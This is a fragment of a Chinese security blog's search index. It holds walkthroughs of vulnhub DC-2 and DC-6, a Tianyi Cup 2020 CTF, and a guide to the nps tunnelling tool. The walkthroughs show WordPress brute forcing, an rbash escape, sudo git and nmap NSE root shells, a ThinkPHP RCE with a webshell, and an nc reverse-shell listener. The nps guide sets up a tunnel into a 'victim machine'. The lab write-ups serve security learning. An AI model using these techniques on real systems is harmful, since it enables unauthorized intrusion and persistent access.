+<h2 id="2-访问网站"><a href="#2-访问网站" class="headerlink" title="2. 访问网站"></a>2. 访问网站</h2><h3 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h3><p>从上面扫描到的信息可以看到,想要访问网站,只能通过<code>http://dc-2</code>,因此需要修改<code>hosts</code>文件,将<code>http://dc-2</code>解析到<code>192.168.147.131</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172286546-e1586177580223.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172286546-300x74.png"></a><br>看到是一个<code>WordPress</code>和第一个<code>flag</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172400798-e1586177605680.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172400798-300x91.png"></a><br><code>flag</code>内容如下<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172423639.png" alt="file"></p>
+<h3 id="爆破WordPress"><a href="#爆破WordPress" class="headerlink" title="爆破WordPress"></a>爆破WordPress</h3><p>通常的密码字典不一定管用,推荐了<a href="https://www.freebuf.com/articles/network/190128.html">cewl</a><br>根据链接的教程创建字典<br><code>cewl http://dc-2 -w dc2_password</code><br>有了密码字典还需要用户名啊,这里使用<a href="https://www.freebuf.com/sectool/174663.html">wpscan</a><br><code>wpscan --url http://dc-2 --enumerate u</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173208850-e1586177690710.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173208850-e1586177690710.png"></a></p>
+<p>扫描出来三个用户名,使用<code>wpscan</code>进行爆破<br><code>wpscan --url http://dc-2 -U jerry(tom) -P dc2_password</code><br>Tom 和 Jerry 的密码都是可以爆出来的,admin不行<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173679186.png" alt="file"><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173729041.png" alt="file"><br>得到密码之后用Jerry的账户登录进入后台,得到第二个flag<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173819297.png" alt="file"></p>
+<p>然后提示,用另外的登录口<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173840215.png" alt="file"></p>
+<h2 id="另外的登录口"><a href="#另外的登录口" class="headerlink" title="另外的登录口"></a>另外的登录口</h2><p>看来是扫描不到位,错过了一些端口,<br><code>nmap -A 192.168.147.131 -p0-65535</code>,进行端口全扫描<br>扫出来一个<code>ssh</code>端口<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174130881-e1586177777434.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174130881-e1586177777434.png"></a><br>使用Tom的账号登录靶机<br><code>ssh tom@192.168.147.131 -p 7744</code><br>发现<code>cat</code>命令被屏蔽了<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174238395.png" alt="file"><br>查看一下<code>PATH</code>和<code>PATH</code>里面的命令<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174279706.png" alt="file"><br>用<code>vi flag*</code>得到第三个flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes</span><br></pre></td></tr></table></figure>
+<h3 id="切换到jerry"><a href="#切换到jerry" class="headerlink" title="切换到jerry"></a>切换到jerry</h3><p>提示需要用Jerry的账户去提权,尝试切换到Jerry的账户<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174360078.png" alt="file"><br>what?没有su?在看了一眼,嗯?rbash?<a href="https://www.howtoing.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/">查找资料</a>,是一个受限的shell,这里屏蔽了<code>/</code>,知识受限,找资料,绕过rbash的办法<br>在<code>vi</code>里面创建一个shell (????)<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174741956.png" alt="file"><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174752874.png" alt="file"><br>得到shell之后,把环境变量加进去<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174807890.png" alt="file"><br>然后就可以切换账户了<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174875420-e1586177809142.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174875420-e1586177937925.png"></a><br>最后的提示是用<code>git</code>提权 (????)</p>
+<p>先看看拥有root权限的指令<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175456005-e1586177847302.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175456005-e1586177925972.png"></a><br>git是不用root密码的,所以真的要用git提权<br>找资料<br><code>sudo git -p help config</code> 然后输入 <code>/bin/bash</code> 就可以得到root权限的shell,拿到最后一个flag<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175578057-e1586177903521.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175578057-e1586177903521.png"></a></p>
+]]></content>
       <categories>
         <category>exploit</category>
         <category>DC</category>
@@ -543,6 +421,56 @@
       <tags>
         <tag>exploit</tag>
         <tag>enum</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub DC-6靶机</title>
+    <url>//DC-6.html</url>
+    <content><![CDATA[<p>vulnhub里的 DC-6 靶机</p>
+<p>初学者难度</p>
+<a id="more"></a>
+
+<h3 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h3><p><a href="https://www.vulnhub.com/entry/dc-6,315/">vulnhub DC-6</a></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="NMAP扫描得到IP"><a href="#NMAP扫描得到IP" class="headerlink" title="NMAP扫描得到IP"></a>NMAP扫描得到IP</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for wordy (192.168.147.135)</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:C1:80:5F (VMware)</span><br></pre></td></tr></table></figure>
+<p>详细扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.135 -A -p0-65535</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.135</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 79 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://wordy/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 00:0C:29:C1:80:5F (VMware)</span><br></pre></td></tr></table></figure>
+<p>需要修改<code>hosts</code>文件访问<code>http://wordy</code><br>然后就可以访问网站了</p>
+<h3 id="针对WordPress的攻击"><a href="#针对WordPress的攻击" class="headerlink" title="针对WordPress的攻击"></a>针对WordPress的攻击</h3><p>使用<code>wpscan</code>工具扫描用户名</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy --enumerate u</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] graham</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] mark</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] sarah</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jens</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
+<p>扫描出来的用户名,加上作者给的提示</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OK, this isn&#39;t really a clue as such, but more of some &quot;we don&#39;t want to spend five years waiting for a certain process to finish&quot; kind of advice for those who just want to get on with the job.</span><br><span class="line"></span><br><span class="line">cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></pre></td></tr></table></figure>
+<p>创建好字典之后爆破</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy -U user -P password.txt</span><br><span class="line"></span><br><span class="line">[SUCCESS] - mark / helpdesk01</span><br></pre></td></tr></table></figure>
+<p>使用<code>mark</code>的账户登录进去<br>查看一下,没有可以挂马的地方啊???<br><a href="https://cloud.tencent.com/developer/article/1472276">师傅的WP</a>上说<code>activity monitor</code> 存在漏洞,用<code>searchsploit</code>查一下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit activity monitor</span><br><span class="line"></span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Comm | exploits/php/webapps/45274.html</span><br></pre></td></tr></table></figure>
+<p>改一下参数就可以执行一个反弹shell</p>
+<h3 id="提权到graham"><a href="#提权到graham" class="headerlink" title="提权到graham"></a>提权到graham</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/vulnhub/dc-6# nc -nvlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.135] 49302</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+<p>看一下用户目录和里面的东西,在<code>/home/mark/stuff/</code>里面找到一个备忘录?</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /home/mark/stuff -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 mark mark 4096 Apr 26  2019 .</span><br><span class="line">drwxr-xr-x 3 mark mark 4096 Apr 26  2019 ..</span><br><span class="line">-rw-r--r-- 1 mark mark  241 Apr 26  2019 things-to-do.txt</span><br></pre></td></tr></table></figure>
+<p>里面直接写了用户名密码(…)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat things*</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br></pre></td></tr></table></figure>
+<p>用ssh连接上去</p>
+<h3 id="提权到jens"><a href="#提权到jens" class="headerlink" title="提权到jens"></a>提权到jens</h3><p>查看一下可以提权的程序</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">    (jens) NOPASSWD: /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+<p>看一下这个文件的权限</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -al /home/jens</span><br><span class="line"></span><br><span class="line">-rwxrwxr-x 1 jens devs   61 Apr  9 16:37 backups.sh</span><br></pre></td></tr></table></figure>
+<p>居然可写,那就把它里面改成<code>/bin/bash</code>,就能得到一个<code>jens</code>的shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">graham@dc-6:/home/jens$ cat backups.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">tar -czf backups.tar.gz /var/www/html</span></span><br><span class="line">/bin/bash</span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh </span><br><span class="line">jens@dc-6:~$ whoami</span><br><span class="line">jens</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>继续找能够提权的玩意</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure>
+<p>nmap 怎么提权啊?师傅的WP上面说用<code>nse</code>提权,所以创建一个脚本文件就行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jens@dc-6:~$ cat rooter </span><br><span class="line">os.execute(&quot;/bin/sh&quot;);</span><br><span class="line">jens@dc-6:~$ sudo nmap localhost --script=rooter</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-04-09 17:22 AEST</span><br><span class="line">NSE: Warning: Loading &#x27;rooter&#x27; -- the recommended file extension is &#x27;.nse&#x27;.</span><br><span class="line"><span class="meta">#</span><span class="bash"> root</span></span><br></pre></td></tr></table></figure>
+<p>这个终端不会有回显自己的字符,用<code>reset</code>命令重置终端就正常了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">root@dc-6:/home/jens# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dc-6:/home/jens# cat /root/</span><br><span class="line">.bash_history   .mysql_history  .profile        </span><br><span class="line">.bashrc         .nano/          theflag.txt     </span><br><span class="line">root@dc-6:/home/jens# cat /root/theflag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>DC</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>wordpress</tag>
       </tags>
   </entry>
   <entry>
@@ -2142,6 +2070,164 @@
       </tags>
   </entry>
   <entry>
+    <title>Jacobi_fly天翼杯2020WP</title>
+    <url>//Jacobi_fly.html</url>
+    <content><![CDATA[<p>2020年天翼杯决赛wp by <strong><code>Jacobi_fly</code></strong></p>
+<p><strong>Ps: 队友懒得上博客，让我来做，所以有幸给出我们做题的WP</strong></p>
+<a id="more"></a>
+
+
+
+<p><strong>0xDktb师傅太强了</strong></p>
+<p><strong>XZLang师傅太强了</strong></p>
+<p><strong>我是废物</strong></p>
+<img src="天翼杯2020/image-20200817214034533.png" alt="image-20200817214034533" style="zoom:50%;" />
+
+
+
+<p>下面差不多是按照过程整理出来的WP（大概），欢迎各位师傅交流（别骂我呜呜呜）</p>
+<h3 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/mWBlpZkSeqI2hof5.jpg!thumbnail.png" alt="img"></p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ulFQZBQ7SbvCE8Bs.jpg!thumbnail.png" alt="img"></p>
+<h3 id="flag23"><a href="#flag23" class="headerlink" title="flag23"></a>flag23</h3><p>APK 解压之后，使用**<code>字符串搜索</code>**得到flag，和域名<a href="http://ps.dasctf.wetolink.com/">http://ps.dasctf.wetolink.com</a> </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/1qsdwRHrNAwAAAgw.png!thumbnail.png" alt="图片"></p>
+<p>ping一下得到ip地址 (也可以直接nmap扫自己的ip/24)</p>
+<h3 id="Nmap-report"><a href="#Nmap-report" class="headerlink" title="Nmap report"></a>Nmap report</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.12.1 </span><br><span class="line">Host is up (0.10s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE    VERSION </span><br><span class="line">22/tcp   open     ssh        Huawei VRP sshd (protocol 1.99) </span><br><span class="line">23/tcp   filtered telnet </span><br><span class="line">80/tcp   open     http       Huawei S5700-series switch httpd </span><br><span class="line">443/tcp  open     ssl/https? </span><br><span class="line">1045/tcp filtered fpitp </span><br><span class="line">Service Info: OS: VRP; Device: switch; CPE: cpe:/o:huawei:vrp </span><br><span class="line">Nmap scan report for 192.168.12.251 </span><br><span class="line">Host is up (0.15s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line"> </span><br><span class="line">Nmap scan report for 192.168.12.252 </span><br><span class="line">Host is up (0.092s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line">Nmap scan report for ps.dasctf.wetolink.com (192.168.12.253) </span><br><span class="line">Host is up (0.081s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br></pre></td></tr></table></figure>
+
+<h3 id="flag17"><a href="#flag17" class="headerlink" title="flag17"></a>flag17</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/oASq6jCeYwtsQUIF.png!thumbnail.png" alt="图片"></p>
+<h3 id="flag18"><a href="#flag18" class="headerlink" title="flag18"></a>flag18</h3><p>查看<code>robots.txt</code> ，里面有一个链接，进入之后看到是</p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/3EwJGFPP1VmIO2lu.png!thumbnail.png" alt="图片"></p>
+<p>得到flag18 </p>
+<h3 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a>flag9</h3><p>80端口登录失败给flag9 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/maRrU72gyrotFALt.png!thumbnail.png" alt="图片"></p>
+<h3 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/hKzubHKKLzdN8jYu.png!thumbnail.png" alt="图片"></p>
+<p><code>robots.txt</code> 文件直接给flag7 </p>
+<h3 id="192-168-12-253-8888目录扫描结果"><a href="#192-168-12-253-8888目录扫描结果" class="headerlink" title="192.168.12.253:8888目录扫描结果"></a>192.168.12.253:8888目录扫描结果</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[10:48:31] Starting: </span><br><span class="line">[10:48:35] 200 -    6KB - /.DS_Store </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login.html </span><br><span class="line">[10:49:12] 200 -    5KB - /Admin/login / </span><br><span class="line">[10:50:02] 200 -    0B  - /backup/ </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin/admin.asp </span><br><span class="line">[10:51:05] 200 -   18KB - /Index </span><br><span class="line">[10:51:05] 200 -   18KB - /index </span><br><span class="line">[10:51:06] 200 -   18KB - /index.html </span><br><span class="line">[10:51:06] 200 -   18KB - /index.php </span><br><span class="line">[10:51:06] 200 -    7KB - /index.php/login/ </span><br><span class="line">[10:51:24] 200 -    7KB - /login </span><br><span class="line">[10:51:24] 200 -    7KB - /Login </span><br><span class="line">[10:51:25] 200 -    7KB - /login.html </span><br><span class="line">[10:51:25] 200 -    7KB - /Login.html </span><br><span class="line">[10:51:26] 200 -    7KB - /login/ </span><br><span class="line">[10:51:26] 200 -    7KB - /login/admin/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/admin/admin.asp </span><br><span class="line">[10:51:27] 200 -    7KB - /login/administrator/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel.%2A </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel/ </span><br><span class="line">[10:51:45] 200 -    7KB - /login/index </span><br><span class="line">[10:51:45] 200 -    7KB - /login/login </span><br><span class="line">[10:51:45] 200 -    7KB - /login/oauth/ </span><br><span class="line">[10:51:46] 200 -    7KB - /login/super </span><br><span class="line">[10:52:07] 200 -    3KB - /README.md </span><br><span class="line">[10:52:09] 200 -  130B  - /robots.txt </span><br><span class="line">[10:52:31] 200 -   24KB - /register </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/autoload.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_files.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_classmap.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_namespaces.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_psr4.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_real.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_static.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/ClassLoader.php </span><br><span class="line">[10:52:41] 200 -   23KB - /vendor/composer/installed.json </span><br><span class="line">[10:52:41] 200 -    1KB - /vendor/composer/LICENSE </span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>是一个<code>thinkphp</code>，经过测试得到版本是<code>5.0.14</code>使用kali的<code>seachsploit</code>，找到一个payload </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/S7N4aR0VTvVh7rZp.png!thumbnail.png" alt="图片"></p>
+<p>s参数是一个RCE，写入一句话木马，使用蚁剑连接，得到后门 </p>
+<h3 id="flag1-amp-amp-flag5"><a href="#flag1-amp-amp-flag5" class="headerlink" title="flag1 &amp;&amp; flag5"></a>flag1 &amp;&amp; flag5</h3><p>在<code>/home</code>目录下发现flag1和flag5，其中flag1可以直接读 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/kf3ZiTKPfXAnEbIG.png!thumbnail.png" alt="图片"></p>
+<p>flag5需要root权限， </p>
+<p>找一下<code>setuid</code>的东西，找到一个<code>nl</code> </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/XxkZNxARcAaQfu9Z.png!thumbnail.png" alt="图片"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看<code>/var/www/html/application/database.php</code>，数据库配置的是内网的一台主机。 </p>
+<p>用冰蝎连接查询flag: </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/u9enAOu1xXM94wGP.png!thumbnail.png" alt="图片"></p>
+<p>或者查看<code>/proc/net/arp</code>也可以发现内网的主机。 </p>
+<h3 id="flag19"><a href="#flag19" class="headerlink" title="flag19"></a>flag19</h3><p>在80端口使用CBC字节翻转攻击的时候，解码<code>cookie</code>时发现。 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/stkRZawsSKCozytq.jpg!thumbnail.png" alt="图片"></p>
+<h3 id="flag22"><a href="#flag22" class="headerlink" title="flag22"></a>flag22</h3><p>登录完之后，上传 <code>test.avi</code> 然后下载，之后拿到 .avi 播放，获得 flag。 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ovsCwUxRD94gsU4e.jpg!thumbnail.png" alt="图片"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>是Jacobi_fly队伍的出道战役（以前不叫这名</p>
+<p>也是我们目前取得的最好的成绩，这里特别感谢我的队友们</p>
+<ul>
+<li><p>初赛由淘宝师傅一人carry，带着一道题没做出来的我和做了签到题的XZLang进入复赛</p>
+</li>
+<li><p>这次淘宝师傅又carry了，大多数flag都是由他交上，一人狂砍1000+分（x</p>
+</li>
+<li><p>XZLang师傅也很NB</p>
+</li>
+<li><p><font color='red'>只有我是废物呜呜呜</font></p>
+</li>
+</ul>
+<p>​    </p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>天翼杯</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用nps</title>
+    <url>//nps.html</url>
+    <content><![CDATA[<p>使用<code>nps</code>工具进行内网渗透</p>
+<a id="more"></a>
+
+
+
+<h2 id="nps下载"><a href="#nps下载" class="headerlink" title="nps下载"></a>nps下载</h2><p><a href="https://github.com/ehang-io/nps">github文档</a></p>
+<p><a href="https://github.com/ehang-io/nps/releases">github release</a></p>
+<p>根据自己的环境下载对应的版本，这里使用<code>linux_amd64_client</code>和<code>linux_amd64_server</code>做例子</p>
+<h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><h3 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h3><p>将<code>linux_amd64_server.tar.gz</code>上传至公网机(<code>vps</code>)，</p>
+<p>使用<code>tar -xvf linux_amd64_server.tar.gz</code>解压，解压后文件如下</p>
+<img src="nps/image-20200819150524939.png" alt="image-20200819150524939" style="zoom:50%;" />
+
+<p>运行<code>./nps install</code>命令，安装工具</p>
+<img src="nps/image-20200819151325928.png" alt="image-20200819151325928" style="zoom:50%;" />
+
+<p>需要（至少）开启这几个端口</p>
+<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><font color=red>一定要改密码</font></p>
+<p>安装完成之后打开配置文件</p>
+<p><code>vim /etc/nps/conf/nps.conf</code></p>
+<img src="nps/image-20200819150819441.png" alt="image-20200819150819441" style="zoom:50%;" />
+
+<p>其中</p>
+<ul>
+<li><code>web_username</code>是web端登录的用户名，在之后会用到</li>
+<li><code>web_password</code>是web端登录的密码</li>
+<li><code>web_port</code>是web服务运行的端口号</li>
+</ul>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>访问<code>ip:web_port</code>进入web端</p>
+<img src="nps/image-20200819151101879.png" alt="image-20200819151101879" style="zoom:50%;" />
+
+<p>输入正确的<code>username</code>和<code>password</code>之后进入界面</p>
+<h3 id="新建客户端"><a href="#新建客户端" class="headerlink" title="新建客户端"></a>新建客户端</h3><p>选择**<code>客户端</code> -&gt; <code>新建</code>**</p>
+<img src="nps/image-20200819151436822.png" alt="image-20200819151436822" style="zoom:50%;" />
+
+<ul>
+<li><code>备注</code>：写给自己看的注释（</li>
+<li><code>认证用户名、密码</code>：攻击机使用这个用户名、密码接入nps服务端，通过隧道和受害机相连</li>
+</ul>
+<h3 id="新建隧道"><a href="#新建隧道" class="headerlink" title="新建隧道"></a>新建隧道</h3><p>新建完客户端之后点击<code>隧道</code></p>
+<img src="nps/image-20200819152251731.png" alt="image-20200819152251731" style="zoom:50%;" />
+
+<p><code>新建</code></p>
+<img src="nps/image-20200819152339494.png" alt="image-20200819152339494" style="zoom:50%;" />
+
+
+
+<h2 id="client"><a href="#client" class="headerlink" title="client"></a>client</h2><p>在新建完客户端之后</p>
+<img src="nps/image-20200819151745081.png" alt="image-20200819151745081" style="zoom:50%;" />
+
+<p>点击**<code>+</code>**</p>
+<img src="nps/image-20200819151827068.png" alt="image-20200819151827068" style="zoom:50%;" />
+
+<p>得到这一串指令</p>
+<p>将<code>linux_amd64_client.tar.gz</code>解压，得到一个<code>npc</code></p>
+<p>将npc上传至受害机</p>
+<p><code>chmod +x npc</code>给予运行权限，然后运行上面服务端给出的指令</p>
+<p>服务端刷新之后可以看到状态变为<code>在线</code></p>
+<img src="nps/image-20200819152123248.png" alt="image-20200819152123248" style="zoom:50%;" />
+
+
+
